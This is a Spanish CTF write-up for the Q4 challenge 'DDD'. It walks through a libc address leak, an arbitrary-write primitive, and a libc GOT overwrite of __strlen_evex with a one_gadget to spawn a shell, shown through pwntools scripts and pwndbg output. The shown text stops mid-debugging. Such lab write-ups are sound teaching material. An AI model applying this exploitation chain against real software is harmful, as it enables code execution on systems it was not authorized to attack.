@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup Q4 DDD</title>
+
+  <meta name="description" content="Resolución del reto DDD del CTF de Q4">
+  <meta name="author" content="xchg2pwn">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup Q4 DDD">
+  <meta name="twitter:description" content="Resolución del reto DDD del CTF de Q4">
+  <meta name="twitter:creator" content="xchg2pwn">  
+  <meta name="twitter:image" content="/images/otros/q4.png" />
+
+  <meta property="og:site_name" content="xchg2pwn" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup Q4 DDD">
+  <meta property="og:description" content="Resolución del reto DDD del CTF de Q4">
+  <meta property="og:image" content="/images/otros/q4.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/images/otros/q4.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="alternate" type="application/rss+xml" title="Writeup Q4 DDD" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="xchg2pwn">
+          <h1 class="panel-cover__title panel-title scale-up-center">xchg2pwn</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del reversing y desarrollo de exploits</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/challenges" title="xchg2pwn" class="blog-button">Challenges</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+
+              <li class="navigation__item grow">
+                <a href="https://github.com/xchg2pwn" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://linkedin.com/in/enrique-de-los-santos-694863233" title="Linkedin" target="_blank">
+                  <i class="icon icon-social-linkedin"></i>
+                  <span class="label">Linkedin</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/xchg2pwn" title="Instagram" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/xchg2pwn" title="Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@xchg2pwn" title="Youtube" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:xchg2pwn@gmail.com" title="Correo Electronico" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>              
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#reversing">Reversing</a></li>
+        <li><a href="#exploitation">Explotación</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">Q4</h4>
+    <picture><img src="/images/otros/q4.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">DDD</h2><br>
+  </header>
+  
+<section class="post" id="reversing">
+<br><h3 class="post-title">Reversing</h3><br>
+
+<p class="plain-text">Si ejecutamos el <a href="https://github.com/xchg2pwn/BinaryExploitation/blob/main/Q4CTF/DDD/ddd.zip">binario</a> nos muestra una dirección en <code class="language-plaintext highlighter-rouge">x64</code> que por ahora no sabemos que es y nos muestra un prompt probablemente para enviar una posible entrada</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ./ddd</span><span class="p">
+
+Deny: 0x7e64f501a780  
+
+>></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Iniciamos con la función <code class="language-plaintext highlighter-rouge">main</code>, esta llama a <code class="language-plaintext highlighter-rouge">printf</code> para mostrar como puntero usando el formato <code class="language-plaintext highlighter-rouge">%p</code> la dirección de <code class="language-plaintext highlighter-rouge">stdout</code> cargada en memoria desde libc</p>
+<a href="/challenges/ddd/1.png" target="_blank"><div><p><img src="/challenges/ddd/1.png"></p></div></a>
+
+<p class="plain-text">Esto lo podemos comprobar desde <code class="language-plaintext highlighter-rouge">gdb</code>, y ya que la dirección mostrada pertenece a libc podemos calcular el offset desde la dirección base, en este caso son <code class="language-plaintext highlighter-rouge">0x21a780</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ gdb</span><span class="p"> -q ddd
+Reading symbols from </span><span class="ve">ddd</span><span class="p">...
+(No debugging symbols found in </span><span class="ve">ddd</span><span class="p">)
+</span><span class="ro">pwndbg></span><span class="p"> r
+Starting program: </span><span class="ve">/home/user/ddd</span><span class="p">
+
+Deny: 0x7ffff7e1a780
+
+>> ^C
+Program received signal SIGINT, Interrupt.
+</span><span class="az">0x00007ffff7d14992</span><span class="p"> in</span><span class="am"> __GI___libc_read </span><span class="p">(</span><span class="az">fd</span><span class="p">=0, </span><span class="az">buf</span><span class="p">=0x7ffff7e19b23 &lt_IO_2_1_stdin_+131>, </span><span class="az">nbytes</span><span class="p">=1)  
+</span><span class="ro">pwndbg></span><span class="p"> x/i 0x7ffff7e1a780
+   </span><span class="az">0x7ffff7e1a780</span><span class="p"> &lt</span><span class="am">_IO_2_1_stdout_</span><span class="p">>:</span><span class="ve">    xchg</span><span class="p">   DWORD PTR [</span><span class="ro">rax</span><span class="p">],</span><span class="ro">ebp</span><span class="p">
+</span><span class="ro">pwndbg></span><span class="p"> vmmap libc.so.6
+LEGEND:</span><span class="am"> STACK</span><span class="p"> |</span><span class="az"> HEAP</span><span class="p"> |</span><span class="ro"> CODE</span><span class="p"> | </span><span class="sa">DATA</span><span class="p"> |</span><span class="ro"> WX</span><span class="p"> | RODATA
+             Start                End Perm     Size Offset File
+</span><span class="sa">    0x555555559000     0x55555555b000 rw-p     2000   5000 /home/user/ddd
+</span><span class="p">►   0x7ffff7c00000     0x7ffff7c28000 r--p    28000      0 /home/user/libc.so.6
+</span><span class="ro">►   0x7ffff7c28000     0x7ffff7dbd000 r-xp   195000  28000 /home/user/libc.so.6
+</span><span class="p">►   0x7ffff7dbd000     0x7ffff7e15000 r--p    58000 1bd000 /home/user/libc.so.6
+►   0x7ffff7e15000     0x7ffff7e19000 r--p     4000 214000 /home/user/libc.so.6
+</span><span class="sa">►   0x7ffff7e19000     0x7ffff7e1b000 rw-p     2000 218000 /home/user/libc.so.6  
+</span><span class="p">    0x7ffff7fbd000     0x7ffff7fc1000 r--p     4000      0 [vvar]
+</span><span class="ro">pwndbg></span><span class="p"> p/x 0x7ffff7e1a780 - 0x7ffff7c00000
+</span><span class="az">$1</span><span class="p"> = 0x21a780
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Automatizamos esto script de <code class="language-plaintext highlighter-rouge">python</code> recibiendo la dirección y restando el offset</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> gdb, log
+
+shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./ddd"</span><span class="p">,</span><span class="s"> "continue"</span><span class="p">)
+
+shell.recvuntil(</span><span class="no">b</span><span class="s">": "</span><span class="p">)
+libc_base</span><span class="o"> =</span><span class="no"> int</span><span class="p">(shell.recvline().strip(),</span><span class="mi"> 16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x21a780</span><span class="p">  
+
+log.info(</span><span class="no">f</span><span class="s">"Libc base: </span><span class="p">{</span><span class="no">hex</span><span class="p">(libc_base)}</span><span class="s">"</span><span class="p">)
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al ejecutar el exploit nos muestra lo que deberia ser la dirección base de <code class="language-plaintext highlighter-rouge">libc</code> que si comparamos con la dirección que muestra <code class="language-plaintext highlighter-rouge">gdb</code> es exactamente la misma</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">exploit.py
+[</span><span class="ve">+</span><span class="p">] Starting local process '/usr/bin/gdbserver': pid 71921
+[</span><span class="az">*</span><span class="p">] running in new terminal: ['/usr/bin/gdb', '-q', './ddd']  
+[</span><span class="az">*</span><span class="p">] Libc base: 0x7d0febe00000
+[</span><span class="az">*</span><span class="p">] Switching to interactive mode
+
+>></span><span class="ro"> $</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">^C
+Program received signal SIGINT, Interrupt.
+</span><span class="az">0x00007d0febf14992</span><span class="p"> in</span><span class="am"> __GI___libc_read </span><span class="p">(</span><span class="az">fd</span><span class="p">=0, </span><span class="az">buf</span><span class="p">=0x7d0fec019b23 &lt_IO_2_1_stdin_+131>, </span><span class="az">nbytes</span><span class="p">=1)  
+</span><span class="ro">pwndbg></span><span class="p"> vmmap libc.so.6
+LEGEND: </span><span class="am">STACK</span><span class="p"> |</span><span class="az"> HEAP</span><span class="p"> |</span><span class="ro"> CODE</span><span class="p"> |</span><span class="sa"> DATA</span><span class="p"> |</span><span class="ro"> WX</span><span class="p"> | RODATA
+             Start                End Perm     Size Offset File
+</span><span class="sa">    0x5d71f37d2000     0x5d71f37d4000 rw-p     2000   5000 /home/user/ddd
+</span><span class="p">►   0x7d0febe00000     0x7d0febe28000 r--p    28000      0 /home/user/libc.so.6
+</span><span class="ro">►   0x7d0febe28000     0x7d0febfbd000 r-xp   195000  28000 /home/user/libc.so.6
+</span><span class="p">►   0x7d0febfbd000     0x7d0fec015000 r--p    58000 1bd000 /home/user/libc.so.6
+►   0x7d0fec015000     0x7d0fec019000 r--p     4000 214000 /home/user/libc.so.6
+</span><span class="sa">►   0x7d0fec019000     0x7d0fec01b000 rw-p     2000 218000 /home/user/libc.so.6
+    </span><span class="p">0x7d0fec1bd000     0x7d0fec1c1000 r--p     4000      0 [vvar]
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Seguimos con la función <code class="language-plaintext highlighter-rouge">main</code>, esta llama a la función <code class="language-plaintext highlighter-rouge">getint</code> que retorna un puntero y llama a <code class="language-plaintext highlighter-rouge">fread</code> para recibir <code class="language-plaintext highlighter-rouge">8</code> bytes que escribirá en la dirección antes obtenida</p>
+<a href="/challenges/ddd/4.png" target="_blank"><div><p><img src="/challenges/ddd/4.png"></p></div></a>
+
+<p class="plain-text">Luego se repite el proceso otra vez, recibe otro puntero y nuevamente escribe <code class="language-plaintext highlighter-rouge">8</code> bytes en esa dirección lo que significa que podemos escribir <code class="language-plaintext highlighter-rouge">2</code> qwords en el lugar que queramos, al finalizar llama a la función <code class="language-plaintext highlighter-rouge">perror</code> y sale con una llamada a <code class="language-plaintext highlighter-rouge">exit</code></p>
+<a href="/challenges/ddd/2.png" target="_blank"><div><p><img src="/challenges/ddd/2.png"></p></div></a>
+
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">getint</code> con la que se recibe la dirección utiliza <code class="language-plaintext highlighter-rouge">fgets</code> para recibir un buffer y se lo pasa a <code class="language-plaintext highlighter-rouge">strtoul</code> para convertirlo a un entero el cual será el valor de retorno</p>
+<a href="/challenges/ddd/3.png" target="_blank"><div><p><img src="/challenges/ddd/3.png"></p></div></a>
+
+</section>
+
+<section class="post" id="exploitation">
+<br><h3 class="post-title">Explotación</h3><br>
+
+<p class="plain-text">Tenemos <code class="language-plaintext highlighter-rouge">2</code> writes de <code class="language-plaintext highlighter-rouge">8</code> bytes, podriamos pensar en sobrescribir la entrada <code class="language-plaintext highlighter-rouge">got</code> en el binario de alguna función que se llame después como lo es <code class="language-plaintext highlighter-rouge">perror</code> pero cuenta con <code class="language-plaintext highlighter-rouge">FULL RELRO</code> lo que nos impide hacerlo, sin embargo el <code class="language-plaintext highlighter-rouge">libc.so.6</code> solo cuenta con <code class="language-plaintext highlighter-rouge">Partial RELRO</code> por lo que podemos sobrescribir en la tabla <code class="language-plaintext highlighter-rouge">got</code> del propio libc</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ checksec</span><span class="p"> ddd
+[</span><span class="az">*</span><span class="p">] '/home/user/ddd'
+    Arch:       amd64-64-little  
+    RELRO:      </span><span class="ve">Full RELRO</span><span class="p">
+    Stack:      </span><span class="ve">Canary found</span><span class="p">
+    NX:         </span><span class="ve">NX enabled</span><span class="p">
+    PIE:        </span><span class="ve">PIE enabled</span><span class="p">
+  
+</span><span class="ve">❯ checksec</span><span class="p"> libc.so.6
+[</span><span class="az">*</span><span class="p">] '/home/user/libc.so.6'
+    Arch:       amd64-64-little  
+    RELRO:      </span><span class="am">Partial RELRO</span><span class="p">
+    Stack:      </span><span class="ve">Canary found</span><span class="p">
+    NX:         </span><span class="ve">NX enabled</span><span class="p">
+    PIE:        </span><span class="ve">PIE enabled</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al llamar a <code class="language-plaintext highlighter-rouge">perror</code> en libc se llaman un par de funciones más hasta llegar a la función <code class="language-plaintext highlighter-rouge">__strlen_evex</code> el cual deberia tener una entrada <code class="language-plaintext highlighter-rouge">got</code> donde podriamos escribir</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg></span><span class="p"> b __strlen_evex
+Punto de interrupción 1 at</span><span class="az"> 0x77ec2adb2220</span><span class="p">: file</span><span class="ve"> ../sysdeps/x86_64/multiarch/strlen-evex.S</span><span class="p">, line 55.
+</span><span class="ro">pwndbg> </span><span class="p">c
+Continuando.
+</span><span class="ro">pwndbg></span><span class="p"> k
+#0  </span><span class="am">__strlen_evex </span><span class="p">() at </span><span class="ve">../sysdeps/x86_64/multiarch/strlen-evex.S</span><span class="p">:55
+#1  </span><span class="az">0x000077ec2ac3b6f4</span><span class="p"> in</span><span class="am"> __dcigettext </span><span class="p">(</span><span class="az">domainname</span><span class="p">=0x77ec2add850a &lt_libc_intl_domainname> "libc", </span><span class="az">msgid1</span><span class="p">=0x77ec2add89aa "Bad address", </span><span class="az">msgid2=msgid2@entry</span><span class="p">=0x0, </span><span class="az">plural=plural@entry</span><span class="p">=0, </span><span class="az">n=n@entry</span><span class="p">=0, </span><span class="az">category=category@entry</span><span class="p">=5) at </span><span class="ve">./intl/dcigettext.c</span><span class="p">:650  
+#2  </span><span class="az">0x000077ec2ac3a903</span><span class="p"> in</span><span class="am"> __GI___dcgettext</span><span class="p"> (</span><span class="az">domainname</span><span class="p">=&ltoptimized out>, </span><span class="az">msgid</span><span class="p">=&ltoptimized out>, </span><span class="az">category=category@entry</span><span class="p">=5) at </span><span class="ve">./intl/dcgettext.c</span><span class="p">:47
+#3  </span><span class="az">0x000077ec2aca86d2</span><span class="p"> in</span><span class="am"> __GI___strerror_r</span><span class="p"> (</span><span class="az">errnum</span><span class="p">=&ltoptimized out>, </span><span class="az">buf=buf@entry</span><span class="p">=0x7fff960a6f20 "0p\n\226\377\177", </span><span class="az">buflen=buflen@entry</span><span class="p">=1024) at </span><span class="ve">./string/_strerror.c</span><span class="p">:34
+#4  </span><span class="az">0x000077ec2ac60e95</span><span class="p"> in</span><span class="am"> perror_internal</span><span class="p"> (</span><span class="az">fp=fp@entry</span><span class="p">=0x58251afa32a0, </span><span class="az">s=s@entry</span><span class="p">=0x5824ec09d028 "!", </span><span class="az">errnum=errnum@entry</span><span class="p">=14) at </span><span class="ve">./stdio-common/perror.c</span><span class="p">:37
+#5  </span><span class="az">0x000077ec2ac60f82</span><span class="p"> in</span><span class="am"> __GI_perror</span><span class="p"> (</span><span class="az">s</span><span class="p">=0x5824ec09d028 "!") at </span><span class="ve">./stdio-common/perror.c</span><span class="p">:74
+#6  </span><span class="az">0x00005824ec09c3f7</span><span class="p"> in</span><span class="am"> main</span><span class="p"> ()
+#7  </span><span class="az">0x000077ec2ac29d90</span><span class="p"> in</span><span class="am"> __libc_start_call_main</span><span class="p"> (</span><span class="az">main=main@entry</span><span class="p">=0x5824ec09c326 &ltmain>, </span><span class="az">argc=argc@entry</span><span class="p">=1, </span><span class="az">argv=argv@entry</span><span class="p">=0x7fff960a74b8) at </span><span class="ve">../sysdeps/nptl/libc_start_call_main.h</span><span class="p">:58
+#8  </span><span class="az">0x000077ec2ac29e40</span><span class="p"> in</span><span class="am"> __libc_start_main_impl</span><span class="p"> (</span><span class="az">main</span><span class="p">=0x5824ec09c326 &ltmain>, </span><span class="az">argc</span><span class="p">=1, </span><span class="az">argv</span><span class="p">=0x7fff960a74b8, </span><span class="az">init</span><span class="p">=&ltoptimized out>, </span><span class="az">fini</span><span class="p">=&ltoptimized out>, </span><span class="az">rtld_fini</span><span class="p">=&ltoptimized out>, </span><span class="az">stack_end</span><span class="p">=0x7fff960a74a8) at</span><span class="ve"> ../csu/libc-start.c</span><span class="p">:392
+#9  </span><span class="az">0x00005824ec09c185</span><span class="p"> in</span><span class="am"> _start</span><span class="p"> ()
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si buscamos la dirección de <code class="language-plaintext highlighter-rouge">__strlen_evex</code> en memoria vemos que está almacenada en otra dirección en la tabla <code class="language-plaintext highlighter-rouge">got</code>, si calculamos el offset a partir de libc obtenemos <code class="language-plaintext highlighter-rouge">0x219098</code>, sabemos que el contenido de esa dirección se ejecutará en <code class="language-plaintext highlighter-rouge">perror</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg></span><span class="p"> x/i __strlen_evex
+   </span><span class="az">0x74f3fadb2220</span><span class="p"> &lt</span><span class="am">__strlen_evex</span><span class="p">>:</span><span class="ve">	endbr64</span><span class="p">
+</span><span class="ro">pwndbg></span><span class="p"> search -t qword 0x74f3fadb2220
+Searching for value: b' "\xdb\xfa\xf3t\x00\x00'
+</span><span class="sa">libc.so.6       0x74f3fae19098</span><span class="ro">  0x74f3fadb2220 (__strlen_evex)  
+pwndbg></span><span class="p"> x/gx 0x74f3fae19098
+</span><span class="az">0x74f3fae19098</span><span class="p"> &lt</span><span class="am">*ABS*@got.plt</span><span class="p">>:	0x000074f3fadb2220
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg></span><span class="p"> vmmap libc.so.6
+LEGEND:</span><span class="am"> STACK</span><span class="p"> |</span><span class="az"> HEAP</span><span class="p"> |</span><span class="ro"> CODE</span><span class="p"> |</span><span class="sa"> DATA</span><span class="p"> |</span><span class="ro"> WX</span><span class="p"> | RODATA
+             Start                End Perm     Size Offset File
+</span><span class="sa">    0x57b06641e000     0x57b066420000 rw-p     2000   5000 /home/user/ddd
+</span><span class="p">►   0x74f3fac00000     0x74f3fac28000 r--p    28000      0 /home/user/libc.so.6
+</span><span class="ro">►   0x74f3fac28000     0x74f3fadbd000 r-xp   195000  28000 /home/user/libc.so.6
+</span><span class="p">►   0x74f3fadbd000     0x74f3fae15000 r--p    58000 1bd000 /home/user/libc.so.6
+►   0x74f3fae15000     0x74f3fae19000 r--p     4000 214000 /home/user/libc.so.6
+</span><span class="sa">►   0x74f3fae19000     0x74f3fae1b000 rw-p     2000 218000 /home/user/libc.so.6  
+</span><span class="p">    0x74f3fafbd000     0x74f3fafc1000 r--p     4000      0 [vvar]
+</span><span class="ro">pwndbg></span><span class="p"> p/x 0x74f3fae19098 - 0x74f3fac00000
+</span><span class="az">$1</span><span class="p"> = 0x219098
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Escribiremos en la entrada <code class="language-plaintext highlighter-rouge">got</code> de <code class="language-plaintext highlighter-rouge">__strlen_evex</code> un qword de <code class="language-plaintext highlighter-rouge">A's</code>, al ejecutarlo podemos ver que corrompe al intentar saltar a la dirección que sobrescribimos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> gdb
+
+shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./ddd"</span><span class="p">,</span><span class="s"> "continue"</span><span class="p">)
+
+shell.recvuntil(</span><span class="no">b</span><span class="s">": "</span><span class="p">)
+libc_base</span><span class="o"> =</span><span class="no"> int</span><span class="p">(shell.recvline().strip(),</span><span class="mi"> 16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x21a780</span><span class="p">  
+
+</span><span class="o">for</span><span class="p"> i</span><span class="o"> in</span><span class="no"> range</span><span class="p">(</span><span class="mi">2</span><span class="p">):
+    shell.sendlineafter(</span><span class="no">b</span><span class="s">">> "</span><span class="p">, </span><span class="no">str</span><span class="p">(libc_base</span><span class="o"> +</span><span class="mi"> 0x219098</span><span class="p">).encode()) </span><span class="c1"># __strlen_evex@got  </span><span class="p">
+    shell.sendafter(</span><span class="no">b</span><span class="s">": "</span><span class="p">,</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="mi"> 8</span><span class="p">)
+
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">Program received signal SIGSEGV, Segmentation fault.
+</span><span class="az">0x000071d315828494</span><span class="p"> in </span><span class="am">*ABS*+0xa8720@plt</span><span class="p"> () from</span><span class="ve"> ./libc.so.6</span><span class="p">
+</span><span class="ro">pwndbg></span><span class="p"> x/i $rip
+=></span><span class="az"> 0x71d315828494 </span><span class="p">&lt</span><span class="am">*ABS*+0xa8720@plt</span><span class="p">+4>:</span><span class="ve">    bnd jmp</span><span class="p"> QWORD PTR [</span><span class="ro">rip</span><span class="p">+</span><span class="az">0x1f0bfd</span><span class="p">]</span><span class="c1">        # 0x71d315a19098 &lt*ABS*@got.plt>  </span><span class="p">
+</span><span class="ro">pwndbg></span><span class="p"> x/gx 0x71d315a19098
+</span><span class="az">0x71d315a19098 </span><span class="p">&lt</span><span class="am">*ABS*@got.plt</span><span class="p">>:	0x4141414141414141
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ya que controlamos el flujo del programa en lugar de escribir <code class="language-plaintext highlighter-rouge">A's</code> podemos escribir un <code class="language-plaintext highlighter-rouge">one_gadget</code> que al ejecutarse nos devuelva una shell, usaremos el que sea mas simple, en este caso el tercero utiliza como argumentos <code class="language-plaintext highlighter-rouge">2</code> registros: <code class="language-plaintext highlighter-rouge">rsi</code> y <code class="language-plaintext highlighter-rouge">rdx</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ one_gadget</span><span class="p"> libc.so.6
+</span><span class="mo">0xebcf1</span><span class="p"> execve("/bin/sh",</span><span class="ve"> r10</span><span class="p">, [</span><span class="ve">rbp</span><span class="p">-</span><span class="mo">0x70</span><span class="p">])
+</span><span class="ro">constraints</span><span class="p">:
+  address </span><span class="ve">rbp</span><span class="p">-</span><span class="mo">0x78</span><span class="p"> is writable
+  [</span><span class="ve">r10</span><span class="p">] == NULL || </span><span class="ve">r10</span><span class="p"> == NULL || </span><span class="ve">r10</span><span class="p"> is a valid argv
+  [[</span><span class="ve">rbp</span><span class="p">-</span><span class="mo">0x70</span><span class="p">]] == NULL || [</span><span class="ve">rbp</span><span class="p">-</span><span class="mo">0x70</span><span class="p">] == NULL || [</span><span class="ve">rbp</span><span class="p">-</span><span class="mo">0x70</span><span class="p">] is a valid envp  
+
+</span><span class="mo">0xebcf5 </span><span class="p">execve("/bin/sh",</span><span class="ve"> r10</span><span class="p">,</span><span class="ve"> rdx</span><span class="p">)
+</span><span class="ro">constraints</span><span class="p">:
+  address </span><span class="ve">rbp</span><span class="p">-</span><span class="mo">0x78</span><span class="p"> is writable
+  [</span><span class="ve">r10</span><span class="p">] == NULL || </span><span class="ve">r10</span><span class="p"> == NULL ||</span><span class="ve"> r10</span><span class="p"> is a valid argv
+  [</span><span class="ve">rdx</span><span class="p">] == NULL || </span><span class="ve">rdx</span><span class="p"> == NULL ||</span><span class="ve"> rdx</span><span class="p"> is a valid envp
+
+</span><span class="mo">0xebcf8</span><span class="p"> execve("/bin/sh",</span><span class="ve"> rsi</span><span class="p">,</span><span class="ve"> rdx</span><span class="p">)
+</span><span class="ro">constraints</span><span class="p">:
+  address </span><span class="ve">rbp</span><span class="p">-</span><span class="mo">0x78</span><span class="p"> is writable
+  [</span><span class="ve">rsi</span><span class="p">] == NULL || </span><span class="ve">rsi</span><span class="p"> == NULL || </span><span class="ve">rsi</span><span class="p"> is a valid argv
+  [</span><span class="ve">rdx</span><span class="p">] == NULL || </span><span class="ve">rdx</span><span class="p"> == NULL || </span><span class="ve">rdx</span><span class="p"> is a valid envp</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Entonces en la entrada <code class="language-plaintext highlighter-rouge">got</code> que sabemos que se ejecuta escribimos el <code class="language-plaintext highlighter-rouge">one_gadget</code>, esto para ver si funciona o no y si pasa el segundo caso saber el porque no lo hace</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> gdb, p64
+
+shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./ddd"</span><span class="p">,</span><span class="s"> "continue"</span><span class="p">)
+
+shell.recvuntil(</span><span class="no">b</span><span class="s">": "</span><span class="p">)
+libc_base </span><span class="o">= </span><span class="no">int</span><span class="p">(shell.recvline().strip(),</span><span class="mi"> 16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x21a780</span><span class="p">
+
+</span><span class="o">for</span><span class="p"> i</span><span class="o"> in</span><span class="no"> range</span><span class="p">(</span><span class="mi">2</span><span class="p">):
+    shell.sendlineafter(</span><span class="no">b</span><span class="s">">> "</span><span class="p">,</span><span class="no"> str</span><span class="p">(libc_base</span><span class="o"> +</span><span class="mi"> 0x219098</span><span class="p">).encode()) </span><span class="c1"># __strlen_evex@got</span><span class="p">
+    shell.sendafter(</span><span class="no">b</span><span class="s">": "</span><span class="p">, p64(libc_base</span><span class="o"> +</span><span class="mi"> 0xebcf8</span><span class="p">))</span><span class="c1">                # execve("/bin/sh", rsi, rdx);  </span><span class="p">
+
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Cuando llegamos a la ejecución del <code class="language-plaintext highlighter-rouge">one_gadget</code> hay una llamada a <code class="language-plaintext highlighter-rouge">execve</code>, el primer argumento es la cadena <code class="language-plaintext highlighter-rouge">/bin/sh</code>, el segundo afortunadamente es <code class="language-plaintext highlighter-rouge">NULL</code> pero el tercero nos podria dar problemas, necesitamos mover <code class="language-plaintext highlighter-rouge">NULL</code> al registro <code class="language-plaintext highlighter-rouge">rdx</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg></span><span class="p"> b *execvpe+1155
+Punto de interrupción 1 at</span><span class="az"> 0x7b6dec8ebd03</span><span class="p">: file</span><span class="ve"> ./posix/execvpe.c</span><span class="p">, line 67.
+</span><span class="ro">pwndbg></span><span class="p"> c
+Continuando.
+
+Breakpoint 1, </span><span class="am">maybe_script_execute</span><span class="p"> (</span><span class="az">envp</span><span class="p">=&ltoptimized out>, </span><span class="az">argv</span><span class="p">=0x7b6dec9da1d7 &lt_nl_C_name>, </span><span class="az">file</span><span class="p">=0x0)  
+</span><span class="ro">pwndbg></span><span class="p"> x/i $rip
